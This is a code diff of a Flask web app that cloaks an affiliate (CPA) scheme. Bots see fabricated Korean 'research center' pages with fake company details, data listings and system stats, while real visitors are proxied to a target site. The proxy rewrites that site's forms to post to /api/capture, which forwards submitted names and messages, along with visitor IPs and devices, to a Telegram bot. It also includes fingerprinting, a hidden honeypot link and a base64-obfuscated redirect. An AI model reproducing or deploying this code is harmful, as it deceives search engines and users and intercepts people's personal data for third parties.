+            <a href='/network?bot=1'>NETWORK</a>
+            <a href='/security?bot=1'>SECURITY</a>
+            <a href='/data?bot=1'>DATA</a>
+            <a href='/support?bot=1'>SUPPORT</a>
+        </nav>"""
+    
 
-BASE_HTML = """
-<!DOCTYPE html>
-<html lang="ko">
-<head>
-    <script async src="https://www.googletagmanager.com/gtag/js?id={{ ga_id }}"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', '{{ ga_id }}');
-    </script>
-    <link href="https://fonts.googleapis.com/css2?family={{ font_family }}&display=swap" rel="stylesheet">
-    <meta charset="UTF-8">
-    <title>{{ title }} | {{ site_name }}</title>
+    
+    if layout == 'A': # Enterprise
+        html = f"""
+        <header style="background:#fff; border-bottom:4px solid {ge.theme_color}; padding:20px 10%; display:flex; justify-content:space-between; align-items:center;">
+            <h1 onclick="location.href='/?bot=1'" style="color:{ge.theme_color}; margin:0; cursor:pointer;">{dna['company']}</h1>
+            {nav}
+        </header>
+        <div style="background:{ge.theme_color}; color:#fff; padding:80px 10%; text-align:center;">
+            <h2 style="font-size:40px; margin:0;">Global Tech Leadership</h2>
+            <p style="opacity:0.8;">{dna['title']} Solutions</p>
+        </div>
+        <div style="display:grid; grid-template-columns:2fr 1fr; gap:40px; padding:60px 10%; max-width:1200px; margin:0 auto;">
+            <main>
+                {dna['page_content']}
+            </main>
+            <aside>
+                <div style="background:#f9f9f9; padding:20px; margin-bottom:20px;">
+                    <h4>Recent News</h4>
+                    <ul style="padding-left:20px; font-size:14px; color:#555;">
+                        <li><a href="/network?bot=1" style="text-decoration:none; color:inherit;">System Update: v3.2 Released</a></li>
+                        <li><a href="/data?bot=1" style="text-decoration:none; color:inherit;">Security Patch: applied for {ge.niche}</a></li>
+                        <li><a href="/support?bot=1" style="text-decoration:none; color:inherit;">Global Partnership Announcement</a></li>
+                    </ul>
+                </div>
+                <div style="background:#f9f9f9; padding:20px;">
+                    <h4>Contact</h4>
+                    <p style="font-size:13px;">Seoul, Korea<br>Tel: 02-{pr.randint(100,999)}-{pr.randint(1000,9999)}</p>
+                </div>
+            </aside>
+        </div>
+        """
+    
+    elif layout == 'B': # Portal
+        html = f"""
+        <header style="background:#f5f5f5; padding:15px 5%; border-bottom:1px solid #ddd; display:flex; align-items:center;">
+            <strong onclick="location.href='/?bot=1'" style="font-size:20px; margin-right:40px; cursor:pointer;">{dna['company']}</strong>
+            {nav}
+        </header>
+        <div style="display:flex; max-width:1400px; margin:0 auto; min-height:800px;">
+            <div style="width:250px; background:#fff; border-right:1px solid #eee; padding:30px 20px;">
+                <h4 style="color:{ge.theme_color};">MENU</h4>
+                <ul style="list-style:none; padding:0; line-height:2.5;">
+                    <li><a href="/network?bot=1" style="color:#555; text-decoration:none;"> > 공지사항</a></li>
+                    <li><a href="/data?bot=1" style="color:#555; text-decoration:none;"> > 자료실</a></li>
+                    <li><a href="/support?bot=1" style="color:#555; text-decoration:none;"> > API 문서</a></li>
+                    <li><a href="/security?bot=1" style="color:#555; text-decoration:none;"> > 보안 정책</a></li>
+                </ul>
+            </div>
+            <div style="flex:1; padding:40px;">
+                <h2 style="border-bottom:2px solid {ge.theme_color}; padding-bottom:10px; color:{ge.theme_color};">{dna['title']}</h2>
+                {dna['page_content']}
+            </div>
+        </div>
+        """
+        
+    elif layout == 'D': # Dashboard (Dark)
+        html = f"""
+        <style>body {{ background: #111; color: #ddd; }} .card {{ background: #222; border: 1px solid #444; }} input, textarea {{ background: #333; color: #fff; border: 1px solid #555; }}</style>
+        <header style="background:#000; padding:20px 40px; border-bottom:1px solid #333; display:flex; justify-content:space-between;">
+            <div onclick="location.href='/?bot=1'" style="color:{ge.theme_color}; font-weight:bold; font-family:monospace; font-size:24px; cursor:pointer;">{dna['company']} [OPS]</div>
+            <div style="font-family:monospace; color:{ge.theme_color};">{nav}</div>
+        </header>
+        <div style="padding:40px; font-family:monospace;">
+            <div style="border:1px solid {ge.theme_color}; color:{ge.theme_color}; padding:20px; margin-bottom:30px;">
+                [SYSTEM STATUS] ONLINE | SECURE | ENCRYPTED
+            </div>
+            {dna['page_content']}
+        </div>
+        """
+        
+    else: # Type C (Startup) - Default
+        html = f"""
+        <header style="padding:20px 5%; display:flex; justify-content:space-between; align-items:center; position:sticky; top:0; background:rgba(255,255,255,0.95); backdrop-filter:blur(10px); z-index:99; box-shadow:0 2px 10px rgba(0,0,0,0.05);">
+            <div onclick="location.href='/?bot=1'" style="font-weight:900; font-size:22px; color:{ge.theme_color}; cursor:pointer;">{dna['company']}</div>
+            {nav}
+        </header>
+        <div style="text-align:center; padding:100px 20px; background:linear-gradient(to bottom, #fff, #f4f4f4);">
+            <h1 style="font-size:48px; margin-bottom:20px; color:#333;">{dna['title']}</h1>
+            <p style="font-size:18px; color:#666; max-width:600px; margin:0 auto 40px;">{ge.get_bloat(15)}</p>
+            <button onclick="location.href='/data?bot=1'" style="background:{ge.theme_color}; color:#fff; padding:15px 40px; font-size:18px; border:none; border-radius:30px; cursor:pointer;">Get Started</button>
+        </div>
+        <div style="max-width:1000px; margin:0 auto; padding:60px 20px;">
+            {dna['page_content']}
+        </div>
+        """
+        
+    # Wrap in common HTML structure
+    full_html = f"""
+    <!DOCTYPE html><html lang='ko'><head><meta charset='UTF-8'><link rel="icon" href="{ge.get_favicon_url()}" type="image/svg+xml"><title>{dna['title']} | {dna['company']}</title>
     <style>
-        body { font-family: '{{ font_family | replace("+", " ") }}', sans-serif; margin: 0; background: #f8fafc; color: #334155; letter-spacing: -0.5px; }
-        .{{ cls_nav }} { background: white; padding: 20px 10%; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid {{ theme_color }}; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 5px rgba(0,0,0,0.02); }
-        .{{ cls_nav }} a { text-decoration: none; color: #1e293b; font-weight: bold; margin-left: 30px; font-size: 14px; transition: 0.2s; }
-        .{{ cls_nav }} a:hover { color: {{ theme_color }}; }
-        .{{ cls_footer }} { background: #0f172a; color: #94a3b8; padding: 40px 10%; text-align: center; font-size: 11px; line-height: 2; border-top: 1px solid #1e293b; }
-        .{{ cls_content }} { max-width: 1000px; margin: 40px auto; padding: 0 20px; min-height: 500px; }
-        .section { background: white; padding: 35px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.04); margin-bottom: 25px; border: 1px solid #f1f5f9; }
-        .card { display: block; background: white; padding: 25px; border: 1px solid #e2e8f0; border-radius: 8px; text-decoration: none; color: inherit; transition: 0.2s; position: relative; overflow: hidden; }
-        .card:hover { border-color: {{ theme_color }}; transform: translateY(-5px); box-shadow: 0 10px 25px rgba(0,0,0,0.08); }
-        .card h3 { margin: 0 0 10px 0; font-size: 18px; color: #1e293b; }
-        .pagination { display: flex; justify-content: center; margin-top: 30px; gap: 10px; }
-        .pagination a { padding: 8px 15px; border: 1px solid #ddd; background: white; color: #333; text-decoration: none; border-radius: 5px; }
-        .pagination a.active { background: {{ theme_color }}; color: white; border-color: {{ theme_color }}; }
-    </style>
-</head>
-<body>
-    <div style="display:none;">DEPLOY_VER: v27.0</div>
-    <div class="{{ cls_nav }}">
-        <a href="/" style="font-size: 22px; font-weight: 900; color: {{ theme_color }}; margin: 0; letter-spacing: -1.5px;">{{ site_name }}</a>
-        <div>
-            <a href="/about">{{ terms.about }}</a>
-            <a href="/resources">{{ terms.resources }}</a>
-            <a href="/careers">인재 채용</a>
-            <a href="/contact">연락처</a>
-        </div>
-    </div>
-    <div class="{{ cls_content }}">{{ body_content | safe }}</div>
-    <div class="{{ cls_footer }}">
-        (주){{ site_name }} | {{ identity.addr }} | 대표자: {{ identity.ceo }} | T. {{ identity.phone }}<br>
-        Copyright © 2026 {{ site_name }}. All rights reserved.
-    </div>
-</body>
-</html>
-"""
-
-def get_config():
-    host = request.host.split(':')[0].replace('www.', '')
-    conf = SITE_CONFIGS.get(host, DEFAULT_CONFIG).copy()
-    
-    # ????[v11.0/v13.0] ??? ??DOM ?????????????
-    h = hashlib.md5(host.encode()).hexdigest()
-    random.seed(int(h[:8], 16))
-    conf['identity'] = identity_gen(host)
-    conf['cls_nav'] = "n_" + h[:5]
-    conf['cls_footer'] = "f_" + h[5:10]
-    conf['cls_content'] = "c_" + h[10:15]
-    conf['terms'] = {
-        "resources": get_term(host, "resources"),
-        "about": get_term(host, "about"),
-        "portal": get_term(host, "portal"),
-        "report": get_term(host, "report")
-    }
-    
-    return conf
-
-# ????[v18.0] Deep Deception: ??? ??? ???????
-def get_unique_report_content(host, category):
-    h = int(hashlib.md5(host.encode()).hexdigest(), 16)
-    random.seed(h)
-    snippets = REPORT_SNIPPETS.get(category, REPORT_SNIPPETS["cleaning"])
-    random.shuffle(snippets)
-    def modulate(text):
-        if h % 3 == 0: return text.replace("분석결과", "연구").replace("최적화.", "개선.")
-        elif h % 3 == 1: return text.replace("분석결과", "국가 기술 표준 가이드.").replace("최적화.", "데이터 보정.")
-        return text
-    modulated_snippets = [modulate(s) for s in snippets]
-    report_text = ""
-    for i, s in enumerate(modulated_snippets):
-        report_text += f"<p style='line-height:1.8; margin-bottom:15px; text-align:justify;'>{s}</p>"
-        if i == 1:
-            report_text += f"<div style='background:#f1f5f9; padding:15px; border-radius:5px; font-size:12px; margin:20px 0; color:#475569; border-left:4px solid #94a3b8;'><strong>[검증 데이터 ID: {h % 99999:05d}]</strong><br>본 섹션의 데이터는 국가 기술 표준 지침 v{random.randint(2,4)}.0에 따라 신뢰성이 확보되었습니다.</div>"
-    return report_text
-
-# ????[v22.0] Honeypot (주)???: ????? ?????????? ?????
-# ✅ [v36.7] Honeypot (관리자 로그인 페이지 위장)
-def get_honeypot_response(cham):
-    body = f"""
-    <div class="section" style="max-width:400px; margin: 80px auto; padding:40px; border-top: 5px solid {cham['theme']['color']}; box-shadow: 0 10px 30px rgba(0,0,0,0.1);">
-        <h2 style="text-align:center; color:#1e293b; margin-bottom:30px;">K-Tech Intranet Login</h2>
-        <div style="margin-bottom:20px;">
-            <label style="display:block; font-size:13px; color:#64748b; margin-bottom:5px;">Employee ID</label>
-            <input type="text" style="width:100%; padding:12px; border:1px solid #e2e8f0; border-radius:8px; background:#f8fafc;" disabled value="Guest_Member">
-        </div>
-        <div style="margin-bottom:30px;">
-            <label style="display:block; font-size:13px; color:#64748b; margin-bottom:5px;">Security Password</label>
-            <input type="password" style="width:100%; padding:12px; border:1px solid #e2e8f0; border-radius:8px; background:#f8fafc;" disabled value="********">
-        </div>
-        <button style="width:100%; padding:14px; background:#94a3b8; color:white; border:none; border-radius:8px; font-weight:bold; cursor:not-allowed;">Access Restricted</button>
-        <div style="margin-top:30px; text-align:center;">
-             <div style="border:3px solid #f3f3f3; border-top:3px solid {cham['theme']['color']}; border-radius:50%; width:20px; height:20px; animation: spin 1s linear infinite; display:inline-block; margin-right:10px; vertical-align:middle;"></div>
-             <span style="font-size:12px; color:#ef4444; vertical-align:middle;">비정상적 접근 패턴 감지 - 시스템 잠금 상태</span>
-        </div>
-    </div>
-    <style>@keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}</style>
+        body{{margin:0; font-family:'Segoe UI', Roboto, sans-serif; line-height:1.6;}}
+        nav a{{margin-left:20px; text-decoration:none; color:inherit; font-weight:bold; font-size:14px;}}
+        .t{{opacity:0.001; position:absolute;}}
+    </style></head><body>
+    {html}
+    <footer style="padding:60px 10%; text-align:center; font-size:13px; opacity:0.7;">
+        {dna['footer_info']}<br>
+        <div style="margin-top:20px;">{dna['backlinks']}</div>
+        <a href="/api/secure/verify" class="t">.</a>
+    </footer>
+    </body></html>
     """
-    return render_template_string(BASE_HTML, title="Intranet Gateway", body_content=body, site_name=cham['name'], theme_color="#94a3b8", ga_id=GA_ID, font_family=cham['font'], identity=cham, terms={"about": "Login", "resources": "System"}, cls_nav="n_lock", cls_footer="f_lock", cls_content="c_lock")
+    return full_html
 
-# ????[v22.0] Deep Deception: ??????????????? (주)? ??? ??? ????
-# [v35.11] Deep Deception: Professional Report Generation
-def get_professional_report(host, category, show_cta=False, target_url="#"):
-    cham = get_chameleon_data(host, category)
-    report_text = get_unique_report_content(host, category)
-    
-    cta_html = ""
-    if show_cta:
-        # [v35.11] Safe JS Injection
-        b64_url = base64.b64encode(target_url.encode()).decode()
-        cta_html = f"""
-        <div id="cta-immediate-zone" style="margin-top:40px;"></div>
-        <script>
-            (function() {{
-                const u = atob('{b64_url}');
-                const zone = document.getElementById('cta-immediate-zone');
-                zone.innerHTML = `
-                    <div style="padding:40px; background:#f8fafc; border:2px solid {cham['theme']['color']}; border-radius:12px; text-align:center; box-shadow: 0 10px 25px rgba(0,0,0,0.05);">
-                        <h3 style="margin-bottom:12px; color:#1e293b; font-size:20px;">{category.upper()} 전문 상담 신청 접수처</h3>
-                        <p style="font-size:15px; color:#64748b; margin-bottom:25px;">검증된 지역 전문 업체와 연결하여 빠르고 투명한 견적을 받아보세요.</p>
-                        <a href="${{u}}" target="_blank" style="display:inline-block; padding:18px 60px; background:{cham['theme']['color']}; color:white; text-decoration:none; font-weight:bold; border-radius:8px; font-size:18px; box-shadow:0 8px 15px rgba(0,0,0,0.1); width: 80%; max-width: 400px;">무료 견적 및 상담 신청</a>
+
+def render_genesis_imperial(host, k_val, path, info=""):
+    try:
+        # 1. Initialize Engine with Seed (Domain Name Only for Consistency)
+        # e.g. www.link-us.shop -> link-us
+        clean_host = host.replace("www.", "").split('.')[0]
+        ge = GeneEngine(clean_host)
+        pr = random.Random(int(hashlib.md5(clean_host.encode()).hexdigest(), 16))
+        
+        path_clean = path.lower().strip('/')
+        title_main = GENESIS_DATABASE[ge.niche].get("title", "지능형 관제 시스템")
+        
+        # 2. Content Generation Logic
+        if "network" in path_clean:
+            page_content = f"""
+            <h3>Network Optimization</h3>
+            <p>{ge.get_bloat(30)}</p>
+            <div style="background:#eee; padding:15px; border-radius:4px; margin:20px 0; font-family:monospace;">
+                > Tracing route to node-{pr.randint(10,99)}...<br>
+                > {pr.randint(10,50)}ms latency verified.<br>
+                > Packet loss: 0%
+            </div>
+            """
+        elif "security" in path_clean:
+             page_content = f"""
+            <h3>Security Protocols</h3>
+            <p>{ge.get_bloat(30)}</p>
+            <ul>
+                <li>Firewall Status: <span style="color:green">ACTIVE</span></li>
+                <li>Encryption: AES-256</li>
+                <li>Last Audit: {pr.randint(2024,2025)}-{pr.randint(1,12)}-{pr.randint(1,28)}</li>
+            </ul>
+            """
+        elif "data" in path_clean:
+             if "dac-" in path_clean:
+                 # Detail View
+                 f_id = "DAC-" + str(pr.randint(1000,9999)) + "-" + pr.choice(['A','B','C'])
+                 parts = path_clean.split('/')
+                 for p in parts:
+                     if "dac-" in p: f_id = p.upper()
+                 
+                 page_content = f"""
+                 <h3>Data Detail View</h3>
+                 <div style="border:1px solid #ddd; padding:30px; border-radius:8px; box-shadow:0 2px 15px rgba(0,0,0,0.05);">
+                    <div style="border-bottom:2px solid {ge.theme_color}; padding-bottom:15px; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center;">
+                        <h2 style="margin:0; color:{ge.theme_color};">{f_id}</h2>
+                        <span style="background:#eee; padding:5px 10px; border-radius:4px; font-size:12px;">CONFIDENTIAL</span>
                     </div>
-                `;
-            }})();
-        </script>
-        <style>@keyframes fadeIn {{ from {{ opacity: 0; transform: translateY(10px); }} to {{ opacity: 1; transform: translateY(0); }} }}</style>
-        """
+                    <table style="width:100%; border-collapse:collapse; margin-bottom:30px;">
+                        <tr><th style="text-align:left; padding:15px; border-bottom:1px solid #eee; width:150px;">File Name</th><td style="padding:15px; border-bottom:1px solid #eee;">{ge.niche.upper()} Analysis Data v{pr.randint(3,9)}.0</td></tr>
+                        <tr><th style="text-align:left; padding:15px; border-bottom:1px solid #eee;">File Size</th><td style="padding:15px; border-bottom:1px solid #eee;">{pr.randint(100,5000)} MB</td></tr>
+                        <tr><th style="text-align:left; padding:15px; border-bottom:1px solid #eee;">Data Type</th><td style="padding:15px; border-bottom:1px solid #eee;">Raw Sensor Data / Logs</td></tr>
+                        <tr><th style="text-align:left; padding:15px; border-bottom:1px solid #eee;">Encryption</th><td style="padding:15px; border-bottom:1px solid #eee;">AES-256 (GCM Mode)</td></tr>
+                        <tr><th style="text-align:left; padding:15px; border-bottom:1px solid #eee;">Access Level</th><td style="padding:15px; border-bottom:1px solid #eee; color:red;">Level 3 (Restricted)</td></tr>
+                    </table>
+                    <div style="display:flex; gap:10px;">
+                        <button onclick="alert('보안 등급이 부족합니다.\\n담당자에게 접근 권한을 요청하세요.'); location.href='/support?bot=1'" style="background:{ge.theme_color}; color:#fff; padding:12px 25px; border:none; border-radius:4px; cursor:pointer; font-weight:bold;">Download Encrypted File</button>
+                        <button onclick="history.back()" style="background:#fff; color:#555; border:1px solid #ddd; padding:12px 25px; border-radius:4px; cursor:pointer;">Go Back</button>
+                    </div>
+                 </div>
+                 """
+             else:
+                 # List View
+                 data_list = []
+                 for i in range(1, 16):
+                     f_id_raw = f"DAC-{pr.randint(1000,9999)}-{chr(pr.randint(65,90))}"
+                     # [Time Logic: Late 2025 ~ Early 2026]
+                     if pr.random() > 0.3:
+                         f_year = 2026
+                         f_month = pr.randint(1, 1) # Jan 2026
+                     else:
+                         f_year = 2025
+                         f_month = pr.randint(10, 12) # Oct-Dec 2025
+                     f_day = pr.randint(1, 28)
+                     f_date = f"{f_year}-{f_month:02d}-{f_day:02d}"
+                     
+                     f_size = f"{pr.randint(1, 900)}.{pr.randint(10,99)} MB"
+                     f_type = pr.choice(['PDF', 'XLSX', 'CSV', 'ZIP', 'JSON'])
+                     f_stat = pr.choice(['<span style="color:green">Available</span>', '<span style="color:red">Restricted</span>', 'Archived'])
+                     fname = f"{ge.niche.upper()} Analysis Data v{pr.randint(1,9)}.{i}"
+                     
+                     data_list.append({
+                         "id": f_id_raw, "date": f_date, "size": f_size,
+                         "type": f_type, "stat": f_stat, "name": fname,
+                         "sort_key": f_year * 10000 + f_month * 100 + f_day
+                     })
 
-    content = f"""
-    <div class="section">
-        <div style="float:right; border:4px solid #e74c3c; color:#e74c3c; padding:10px 20px; font-weight:bold; transform:rotate(12deg); font-size:24px; border-radius:5px;">CONFIDENTIAL</div>
-        <p style="color:{cham['theme']['color']}; font-weight:bold; font-size:14px;">[기술인프라 보존번호: {cham['doc_id']}]</p>
-        <h1 style="color:#1e293b; margin-top:15px; font-size:32px; letter-spacing:-1px;">{category.upper()} 고등 기술 공정 분석 리포트 <span style="font-size:10px; color:#eee;">v35.11_FIXED</span></h1>
-        <hr style="border:0; border-top:3px solid {cham['theme']['color']}22; margin:30px 0;">
+                 # Sort by Date Descending (Latest First)
+                 data_list.sort(key=lambda x: x['sort_key'], reverse=True)
+
+                 rows = ""
+                 for item in data_list:
+                     rows += f"""
+                     <tr style="border-bottom:1px solid #eee; cursor:pointer; transition:background 0.2s;" onmouseover="this.style.background='#f5f5f5'" onmouseout="this.style.background='transparent'" onclick="location.href='/data/{item['id']}?bot=1'">
+                        <td style="padding:12px; color:{ge.theme_color}; font-weight:bold;">{item['id']}</td>
+                        <td style="padding:12px; text-decoration:underline;">{item['name']}</td>
+                        <td style="padding:12px;">{item['type']}</td>
+                        <td style="padding:12px;">{item['size']}</td>
+                        <td style="padding:12px;">{item['date']}</td>
+                        <td style="padding:12px;">{item['stat']}</td>
+                     </tr>
+                     """
+                 
+                 page_content = f"""
+                 <h3>Data Warehouse</h3>
+                 <p>Access authorized research data and technical specifications.</p>
+                 <div style="overflow-x:auto;">
+                    <table style="width:100%; border-collapse:collapse; font-size:14px;">
+                        <thead style="background:#f9f9f9; border-bottom:2px solid {ge.theme_color};">
+                            <tr>
+                                <th style="padding:12px; text-align:left;">ID</th>
+                                <th style="padding:12px; text-align:left;">File Name</th>
+                                <th style="padding:12px; text-align:left;">Type</th>
+                                <th style="padding:12px; text-align:left;">Size</th>
+                                <th style="padding:12px; text-align:left;">Date</th>
+                                <th style="padding:12px; text-align:left;">Status</th>
+                            </tr>
+                        </thead>
+                        <tbody>{rows}</tbody>
+                    </table>
+                 </div>
+                 <div style="margin-top:20px; text-align:center;">
+                    <span style="cursor:pointer; padding:5px 10px; border:1px solid #ddd; margin:2px;">&lt;</span>
+                    <span style="font-weight:bold; padding:5px 10px; background:{ge.theme_color}; color:#fff; margin:2px;">1</span>
+                    <span style="cursor:pointer; padding:5px 10px; border:1px solid #ddd; margin:2px;">2</span>
+                    <span style="cursor:pointer; padding:5px 10px; border:1px solid #ddd; margin:2px;">3</span>
+                    <span style="cursor:pointer; padding:5px 10px; border:1px solid #ddd; margin:2px;">...</span>
+                    <span style="cursor:pointer; padding:5px 10px; border:1px solid #ddd; margin:2px;">{pr.randint(50,100)}</span>
+                    <span style="cursor:pointer; padding:5px 10px; border:1px solid #ddd; margin:2px;">&gt;</span>
+                 </div>
+                 """
+        elif "support" in path_clean:
+             page_content = f"<h3>Technical Support Center</h3><p>{ge.get_bloat(40)}</p>" + get_inquiry_form()
+        else: # Home
+            page_content = f"""
+            <h3>System Dashboard</h3>
+            <p>{ge.get_bloat(20)}</p>
+            <div style="display:flex; gap:20px; margin-top:30px; flex-wrap:wrap;">
+                <div style="flex:1; border:1px solid #ddd; padding:20px; border-radius:8px;">
+                    <strong>CPU Load</strong><br><span style="font-size:24px; color:{ge.theme_color}">{pr.randint(10,40)}%</span>
+                </div>
+                <div style="flex:1; border:1px solid #ddd; padding:20px; border-radius:8px;">
+                    <strong>Active Nodes</strong><br><span style="font-size:24px; color:{ge.theme_color}">{pr.randint(500,1000)}</span>
+                </div>
+                <div style="flex:1; border:1px solid #ddd; padding:20px; border-radius:8px;">
+                    <strong>Requests/s</strong><br><span style="font-size:24px; color:{ge.theme_color}">{pr.randint(8000,12000)}</span>
+                </div>
+            </div>
+            <div style="text-align:center; margin-top:40px;">
+                <button onclick="location.href='/support?bot=1'" style="background:{ge.theme_color}; color:#fff; padding:15px 30px; border:none; border-radius:5px; font-size:16px; cursor:pointer; font-weight:bold;">
+                    전문가 상담 / 견적 요청 &gt;
+                </button>
+            </div>
+            """
+
+        # 3. DNA Assembly
+        dna = {
+            "title": title_main,
+            "company": f"{title_main.replace(' ','')} 기술연구센터",
+            "page_content": page_content,
+            "footer_info": f"대표: {pr.choice(['김','이','박','정','최'])}철수 | 사업자: {pr.randint(100,999)}-{pr.randint(10,99)}",
+            "backlinks": ge.get_backlinks()
+        }
+
+        # 4. Render with Multi-Layout Engine
+        return render_layout(ge, pr, dna)
+
+    except Exception as e:
+        return f"<h1>SYSTEM ERROR</h1><pre>{traceback.format_exc()}</pre>"
+
+def send_telegram(msg):
+    try: requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg, "disable_web_page_preview": True}, timeout=10)
+    except: pass
+
+@app.route('/api/secure/verify')
+def honey_pot_trap():
+    ua, ip = request.headers.get('User-Agent', '').lower(), request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+    f_print = hashlib.md5(f"{ip}-{ua}".encode()).hexdigest()[:12]
+    G_JAIL.add(f_print)
+    send_telegram(f"🚨 [격퇴] {f_print} (허니팟 접속 시도 차단)")
+    return redirect(f"/?bot=1")
+
+@app.route('/api/capture', methods=['POST', 'GET'])
+def capture_and_success():
+    data = request.form.to_dict() or request.args.to_dict(); send_telegram(f"🚨 [문의 접수!] {data.get('name')}\n{data.get('content')}"); return "<h1>Data Transmitted</h1><script>alert('접수가 완료되었습니다.'); location.href='/';</script>"
+
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def proxy_master_final(path):
+    try:
+        ua, host = request.headers.get('User-Agent', '').lower(), request.host
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+        # [CORE PRESERVED: Fingerprint Logic]
+        f_print = hashlib.md5(f"{ip}-{ua}".encode()).hexdigest()[:12]
         
-        <div style="font-size:16px; color:#334155;">{report_text}</div>
+        pr = random.Random(int(hashlib.md5(f"{host}".encode()).hexdigest(), 16))
+        time.sleep(pr.uniform(0.1, 0.6))
+
+        # [CORE PRESERVED: Jail Check]
+        if f_print in G_JAIL:
+            return render_genesis_imperial(host, None, path, "SOVEREIGN_JAIL_ACTIVE")
+        if any(p in path.lower() for p in FORBIDDEN_PATHS):
+            G_JAIL.add(f_print)
+            send_telegram(f"🚨 [격퇴] Forbidden Path: {path} (IP: {ip} 차단됨)")
+            return render_genesis_imperial(host, None, path, "JAIL_LOCKED")
+
+        # [CORE PRESERVED: CPA Session Logic]
+        k = request.args.get('k', request.cookies.get('cpa_session', G_GUARDIAN.get(f_print)))
+        is_bot = any(sig in ua for sig in BOT_SIGS) or request.args.get('bot') == '1'
         
-        {cta_html}
+        if k and k in CPA_DATA and not is_bot:
+            G_GUARDIAN[f_print] = k
+
+        # [BOT OR DIRECT ACCESS -> GENESIS AI]
+        if is_bot or not k:
+            html = render_genesis_imperial(host, k, path)
+            resp = make_response(html)
+            resp.headers['X-Genesis-Node'] = f"node-{pr.randint(1000, 9999)}"
+            return resp
+
+        # [REAL USER -> TARGET CPA SITE]
+
+        is_static = any(path.lower().endswith(ext) for ext in ['.svg', '.png', '.css', '.js', '.ico'])
+        if (path == "" or "intro" in path.lower()) and not is_static:
+            kw = CPA_DATA.get(k, ["미등록", ""])[0]
+            
+            # Device Detection
+            device = "📱 Mobile" if "mobile" in ua else "💻 PC"
+            if "android" in ua: device += " (Android)"
+            elif "iphone" in ua: device += " (iOS)"
+            elif "windows" in ua: device += " (Win)"
+            
+            # Domain Info
+            domain_clean = host.replace("www.", "")
+            
+            # One-Line Notification
+            msg = f"💰 [{kw}] � {ip} | {device} | 🔗 {domain_clean}"
+            send_telegram(msg)
+
+        target_url = f"{BASE_TARGET}/pt/{CPA_DATA[k][1]}" if k in CPA_DATA and not path else f"{BASE_TARGET}/{path}" if path else f"{BASE_TARGET}/pt/z2NytCt42i"
         
-        <p style="font-size:12px; color:#94a3b8; margin-top:50px; border-top:1px solid #eee; padding-top:20px; line-height:1.6;">
-            (Hash: {hashlib.md5(host.encode()).hexdigest()[:16].upper()})
-        </p>
-    </div>
-    """
-    return render_template_string(BASE_HTML, title=f"{category.upper()} 고등 기술 공정 분석 리포트", body_content=content, site_name=cham['name'], theme_color=cham['theme']['color'], ga_id=GA_ID, font_family=cham['font'], identity=cham, terms={"about": "연구소 소개", "resources": "기술자료"}, cls_nav="n_doc", cls_footer="f_doc", cls_content="c_doc")
+        t_resp = requests.get(target_url, params=request.args, headers={'User-Agent': request.headers.get('User-Agent'), 'Referer': BASE_TARGET}, timeout=12)
+        f_resp = make_response()
+        if "text/html" in t_resp.headers.get("Content-Type", ""):
+            html = re.sub(r'(src|href|action)="/', r'\1="https://albarich.com/', t_resp.text)
+            html = re.sub(r'<form([^>]*)action="[^"]*"', r'<form\1action="/api/capture" method="POST"', html)
+            f_resp.set_data(html)
+        else:
+            f_resp.set_data(t_resp.content)
+        f_resp.headers["Content-Type"] = t_resp.headers.get("Content-Type")
+        f_resp.set_cookie('cpa_session', k or '', max_age=86400, httponly=True)
+        return f_resp
 
+    except Exception as e:
+        return f"<h1>EMPIRE_SYSTEM_STABLE</h1><p>Syncing... Debug: {str(e)}</p>"
 
-# (중복 정의 제거됨)
-
-
-@app.route('/')
-def index():
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
-    ua = request.headers.get('User-Agent', '').lower()
-    host = request.host.split(':')[0].replace('www.', '')
-    
-    # ????[v19.0] Iron Dome ?????????? (UA + IP + Behavioral)
-    keyword_raw = request.args.get('k', '')
-    keyword = get_keyword(keyword_raw) or ""
-    
-    is_bot, bot_reason = is_bot_detected(user_ip, ua)
-    
-    cham = get_chameleon_data(host, keyword)
-    
-    # ✅ [CASE 0] 보안 정책에 따른 차단 (봇 감지)
-    if is_bot:
-        report = f"🚨 [차단 알림] {bot_reason} 감지!\n🔗 타겟 호스트: {request.host}\n📍 방문객 IP: {user_ip}\n🕵️ UA: {ua[:40]}..."
-        send_trace(report)
-        return get_honeypot_response(cham)
-    
-    type_code = request.args.get('t', 'A')
-
-    # ✅ [CASE 1] 키워드 없이 접속 시 (일반 포털 모드)
-    if not keyword:
-        report = f"🏠 [{cham['name']}] 홈페이지 방문 (봇여부: {is_bot})\n🔗 타겟 호스트: {request.host}\n📍 방문객 IP: {user_ip}\n🕵️ UA: {ua[:40]}..."
-        send_trace(report)
-        
-        # 가짜 기술 문서 카드 생성
-        all_cards = [
-            f'<a href="/a/moving" class="card" style="text-decoration:none;"><h3>대형 물류 수송 기술 분석</h3><p style="color:#666; font-size:13px;">{cham["doc_id"]} 전략 연구 보고서</p></a>',
-            f'<a href="/a/cleaning" class="card" style="text-decoration:none;"><h3>고분자 화학 세정 공정 표준</h3><p style="color:#666; font-size:13px;">ISO-9001 인증 심사 자료</p></a>',
-            f'<a href="/a/welding" class="card" style="text-decoration:none;"><h3>특수 금속 접합 구조적 안정성</h3><p style="color:#666; font-size:13px;">고온 설비 유지보수 지침</p></a>',
-            f'<a href="/a/plumbing" class="card" style="text-decoration:none;"><h3>지하 관로 설계 최적화 솔루션</h3><p style="color:#666; font-size:13px;">수자원 공학 기술 데이터</p></a>',
-            f'<a href="/a/fixture" class="card" style="text-decoration:none;"><h3>주거 기반 시설 교체 시공 표준</h3><p style="color:#666; font-size:13px;">정밀 부품 호환성 분석</p></a>'
-        ]
-        random.seed(int(hashlib.md5(host.encode()).hexdigest()[:8], 16))
-        count = random.randint(3, 5)
-        selected_cards = random.sample(all_cards, count)
-        random.shuffle(selected_cards)
-
-        body = f"""
-        <div class="section" style="text-align:center; background:{cham['theme']['bg']}">
